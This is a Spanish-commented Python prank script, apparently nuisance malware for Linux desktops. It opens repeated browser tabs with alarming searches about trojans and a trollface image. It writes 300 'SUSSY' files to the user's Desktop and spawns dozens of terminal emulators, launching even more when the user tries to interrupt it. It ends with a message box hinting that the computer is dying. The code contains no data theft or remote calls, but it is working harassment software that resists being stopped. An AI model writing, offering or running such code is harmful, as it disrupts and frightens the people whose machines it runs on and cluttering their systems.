from sys import exc_info
from os import path, system, listdir
from random import choice
from webbrowser import open as wopen
from time import sleep
from tkinter import messagebox

# Por si hay algún error
def handle(e):
    
               
     exc_type, exc_obj, exc_tb = exc_info()
     fname = path.split(exc_tb.tb_frame.f_code.co_filename)[1]
     exc = f"""
Error en el archivo {__file__}:
Nombre del error: {type(e).__name__}

Descripción del error: {e}

Información detallada: {exc_type} 
Archivo: {fname} 
Línea: {exc_tb.tb_lineno}

               """
     print(exc)

def webOpen():
     try:
          tup_searches = (
               'https://www.google.com/search?q=como+eliminar+virus+troyano+linux+atacante',
               'https://www.google.com/search?q=ayuda+mi+computador+hace+cosas+raras',
               'https://www.google.com/search?q=por+que+mi+pc+abre+pestañas+aleatorias',
               'https://www.google.com/search?q=descargar+hack+among+us+2020+octubre',
               'https://www.google.com/search?q=como+curar+el+conjuntivitis',
               'https://www.google.com/search?q=que+hacer+si+me+embargan+la+casa',
               'https://www.google.com/search?q=descargar+minecraft+premium+gratis+linux+tentador+2020',
               'http://4.bp.blogspot.com/-w6UkeTKqd3E/UpdEMzDKJFI/AAAAAAAAFEE/rh0BkH-AklU/s1600/3d-trollface-nodding-ok-yes-agree-troll-face.gif'
          )

#         Abre 15 pestañas eligiendo aleatoriamente
#         en la tupla de búsquedas de la parte de arriba
          for _ in range(15):
               wopen(choice(tup_searches))
               sleep(15)               
               
     except KeyboardInterrupt:
          
#         Abrirá más terminales por cada vez que el usuario intente cancelar
#         el programa
          for _ in range(50):
               try:
                    system('qterminal')
                    
                    system('terminator')
                    
                    system('alacritty')
                    
                    system('xterm')
                    
                    system('konsole')
                    
                    
                    system('xfce4-terminal-emulator')
               except:
                    pass
          print("XD")

     except Exception as e:
          handle(e)
          
def annoying_behavior():
     try:
          count = 0
          sleep(10)
          
#         Intenta abrir diferentes emuladores
#         de terminal
          usr = listdir('/home/')[0]
#         Crea archivos de texto en el escritorio
          for _ in range(300):
               count += 1
               with open(f'/home/{usr}/Desktop/SUSSY{count}.txt', 'w+') as f:
                    f.write("SO SUSSY")
               
               
          for _ in range(50):
               system('qterminal')
               
               system('terminator')
               
               system('alacritty')
               
               system('xterm')
               
               system('konsole')
               
               
               system('xfce4-terminal-emulator')
                    
     except KeyboardInterrupt:
          print("XD")
          for _ in range(50):
               system('qterminal')
               
               system('terminator')
               
               system('alacritty')
               
               system('xterm')
               
               system('konsole')
               
               
               system('xfce4-terminal-emulator')
     except Exception as e:
          handle(e)
          messagebox.askquestion(title="Sigues ahi?", message="Sigues usando el pc? disfruta sus  ultimos instantes de vida")

               